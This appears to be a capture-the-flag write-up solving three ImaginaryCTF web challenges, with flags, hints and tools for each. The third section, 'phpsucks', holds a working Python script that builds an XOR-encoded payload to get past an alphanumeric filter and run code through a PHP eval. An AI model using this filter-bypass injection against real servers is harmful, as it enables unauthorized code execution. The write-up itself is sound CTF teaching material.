# Replacement

## Description

Red flags and fake flags form an equivalence class.

## Attachments

`ictf:f2e8b632f71c2cab`
`http://puzzler7.imaginaryctf.org:4003/`

## Solution

After logging in with the given creds, we see that there is a fake flag.
Checking the source code shows a directory `/totallynottheflag`.

When we try to access the directory, the flag is being showed for a sec and being replaced by the fake flag.

So disable the javascript and check the source code.
You can use [Burpsuite](https://portswigger.net/burp) also.

## flag 

`ictf{gr333333333333333n_flags_are_g00d_tho}`

<br>

# Backtracking

## Description

Look at how far you've come

## Attachments

`http://puzzler7.imaginaryctf.org:4007/`
`ictf:24dbcbffb8208024`

## Solution

Checking the source code shows us an obfuscated javascript code.
I have used this [deobfuscator](https://lelinhtinh.github.io/de4js/) which showed [history.pushState](https://www.javascripttutorial.net/web-apis/javascript-history-pushstate/).

This function adds the provided url to the history stack.
There appears to a flag being added to the history stack, So simply clicking back button gives us the flag.

## flag

`ictf{it's_me_the_friend_you_made_along_the_way}`

<br>

# phpsucks

## Description

I have an eval but with a robust user input validation.

## Attachments

`http://puzzler7.imaginaryctf.org:4011/`

## Solution

Going over to the provided link shows a php code which is taking input from user by filtering alphanumeric characters and passing it to the eval.

The flag can be viewed if we can execute `secret_function()`.

The following script passes xor between two strings as input.

script

```
import requests
from Crypto.Util.strxor import strxor
import string

fun = "secret_function"
lis = """'_.@/{}()=*,-:<>?["]|"""
nope = string.ascii_lowercase + string.ascii_uppercase + string.digits
final = ""
final2 = ""

for let in fun:
    for i in lis:
        s = strxor(let.encode(), i.encode()).decode()
        if s not in nope and s in lis:
            final += s
            final2 += i
            break

payload = f"$_='{final}'^'{final2}';$_();"

url = f"http://puzzler7.imaginaryctf.org:4011/?cmd={payload}"
req = requests.get(url)
print(req.text[req.text.find('ictf'):])
```

## flag 

`ictf{th3r3_4r3_n0_l4ngu4g3_l1k3_Php}`

<br>

